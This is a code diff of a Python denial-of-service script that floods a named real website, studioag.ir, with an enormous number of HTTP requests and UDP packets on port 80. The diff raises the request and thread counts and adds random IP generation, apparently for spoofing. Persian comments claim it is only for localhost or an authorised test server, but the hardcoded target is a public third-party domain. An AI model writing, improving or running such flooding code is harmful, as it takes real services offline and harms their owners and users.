@@ -4,9 +4,24 @@ import sys
 import _thread
 from flask import Flask, render_template_string
 import requests
+import argparse
+import signal
+
+stopped = False
+def handle_sigint(signum, frame):
+    global stopped
+    stopped = True
+signal.signal(signal.SIGINT, handle_sigint)
+
+def random_ipv4():
+    # تولید یک آی‌پی تصادفی (از رنج‌های عمومی استفاده نکن — فقط برای تست روی سرور خودت)
+    return "{}.{}.{}.{}".format(random.randint(1, 254),
+                                random.randint(0, 255),
+                                random.randint(0, 255),
+                                random.randint(1, 254))
 
 URL = "https://studioag.ir"  # فقط localhost یا سرور تست با مجوز
-TOTAL = 999999999999
+TOTAL = 999999999999999
 session = requests.Session()  # نگهداری اتصال (keep-alive)
 for i in range(TOTAL):
     try:
@@ -15,7 +30,7 @@ for i in range(TOTAL):
     except Exception as e:
         print("error", i, e)    
 site = ("studioag.ir")
-thread_count = ("9999999999999999999999999999999")
+thread_count = ("999999999999999999999999999999999")
 ip = socket.gethostbyname(site)
 UDP_PORT = 80
 MESSAGE = 'virus32'
